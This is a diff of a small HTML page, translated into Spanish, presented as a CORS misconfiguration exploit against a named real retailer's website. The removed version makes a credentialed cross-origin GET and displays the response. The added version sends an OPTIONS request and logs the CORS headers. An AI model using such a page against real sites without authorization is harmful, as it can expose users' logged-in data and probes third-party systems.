@@ -2,54 +2,46 @@
 <html>
   <head>
     <meta charset="UTF-8">
-    <title>CORS POC Exploit</title>
+    <title>Explotación CORS con OPTIONS</title>
   </head>
   <body>
     <center>
-      <h2>CORS POC Exploit</h2>
-      <h3>Test CORS Configuration</h3>
+      <h2>Explotación CORS con OPTIONS</h2>
+      <h3>Prueba la configuración CORS</h3>
       <div id="demo">
-        <button type="button" onclick="cors()">Exploit</button>
+        <button type="button" onclick="exploitOptions()">Ejecutar Exploit</button>
       </div>
     </center>
 
     <script>
-      function cors() {
-        var xhttp = new XMLHttpRequest();
-
-        // Configuramos el manejador de la respuesta
-        xhttp.onreadystatechange = function() {
-          if (this.readyState === 4) {
-            if (this.status === 200) {
-              // Si la respuesta es 200 OK, se muestra el contenido
-              document.getElementById("demo").innerHTML = "Response: " + this.responseText;
+      function exploitOptions() {
+        var xhr = new XMLHttpRequest();
+        xhr.onreadystatechange = function() {
+          if (xhr.readyState === 4) {
+            if (xhr.status === 200) {
+              document.getElementById("demo").innerHTML = "Respuesta:<br>" + xhr.responseText;
             } else {
-              // Si no, se muestra un mensaje de error
-              document.getElementById("demo").innerHTML = "Error: " + this.status + " - " + this.statusText;
+              document.getElementById("demo").innerHTML = "Error: " + xhr.status + " - " + xhr.statusText;
             }
-            // Mostramos en consola algunos encabezados CORS de la respuesta
-            console.log("Access-Control-Allow-Origin:", this.getResponseHeader("Access-Control-Allow-Origin"));
-            console.log("Access-Control-Allow-Credentials:", this.getResponseHeader("Access-Control-Allow-Credentials"));
+            // Mostrar en consola algunos de los encabezados de CORS
+            console.log("Access-Control-Allow-Origin:", xhr.getResponseHeader("Access-Control-Allow-Origin"));
+            console.log("Access-Control-Allow-Methods:", xhr.getResponseHeader("Access-Control-Allow-Methods"));
+            console.log("Access-Control-Allow-Headers:", xhr.getResponseHeader("Access-Control-Allow-Headers"));
           }
         };
 
-        // Manejador para errores de red o problemas de CORS
-        xhttp.onerror = function() {
-          console.error("Network error or CORS issue occurred.");
+        xhr.onerror = function() {
+          console.error("Error de red o problema CORS");
         };
 
-        // Cambia la URL al endpoint que deseas probar
-        xhttp.open(
-          "GET",
+        // Se envía una solicitud OPTIONS a la URL vulnerable
+        xhr.open(
+          "OPTIONS",
           "https://www.jdsports.es/?utm_source=google&utm_medium=cpc&utm_campaign=es_brand_em&gad_source=1&gclid=CjwKCAiAnpy9BhAkEiwA-P8N4jxNZxSvBYe9xGNhS-XVxZEJoZpQsUdRS8WuV9zdjwez-lz4a-cYlxoCPvcQAvD_BwE",
           true
         );
 
-        // Si necesitas enviar credenciales (cookies, tokens) asegúrate de que el servidor lo permita.
-        // Nota: Si no es necesario, puedes comentar o eliminar esta línea.
-        xhttp.withCredentials = true;
-        
-        xhttp.send();
+        xhr.send();
       }
     </script>
   </body>
